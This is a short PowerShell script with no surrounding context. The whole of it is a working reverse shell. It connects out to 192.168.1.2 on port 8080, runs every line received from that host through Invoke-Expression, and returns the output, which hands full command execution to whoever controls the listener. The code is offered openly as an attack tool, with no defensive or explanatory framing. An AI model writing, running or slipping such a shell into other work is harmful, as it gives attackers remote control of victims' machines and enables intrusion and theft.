$client = New-Object System.Net.Sockets.TCPClient('192.168.1.2', 8080)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

while ($true) {
    $line = $reader.ReadLine()
    $cmd = (Invoke-Expression -Command $line 2>&1 | Out-String).Trim()
    $writer.WriteLine($cmd)
    $writer.Flush()
}

$reader.Close()
$writer.Close()
$client.Close()
